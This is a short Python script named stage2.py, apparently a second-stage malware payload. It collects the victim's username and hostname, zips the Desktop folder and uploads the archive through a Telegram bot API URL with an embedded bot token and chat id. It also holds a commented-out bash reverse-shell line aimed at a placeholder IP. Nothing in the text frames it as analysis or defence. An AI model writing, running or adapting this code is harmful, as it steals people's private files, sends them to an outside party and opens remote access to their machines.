# stage2.py
import os
import requests
import shutil
import subprocess

# 1. Get user info
user = os.getlogin()
hostname = os.uname().nodename if os.name != 'nt' else os.popen('hostname').read()

# 2. Steal desktop files
desktop = f"/home/{user}/Desktop" if os.name != 'nt' else f"C:\\Users\\{user}\\Desktop"
files = [f for f in os.listdir(desktop) if f.endswith(('.pdf', '.docx', '.xlsx'))]

# 3. Zip and exfil to Telegram
shutil.make_archive("exfil", 'zip', desktop)
url = "https://api.telegram.org/bot8268540452:AAEQl6dAmNxWTrfVEOy4liqMoxt2qm1-_hs/sendDocument"
with open("exfil.zip", "rb") as f:
    requests.post(url, data={"chat_id": "3032183658"}, files={"document": f})

# 4. Spawn reverse shell (optional)
# subprocess.Popen("bash -c 'bash -i >& /dev/tcp/YOUR_IP/443 0>&1'", shell=True)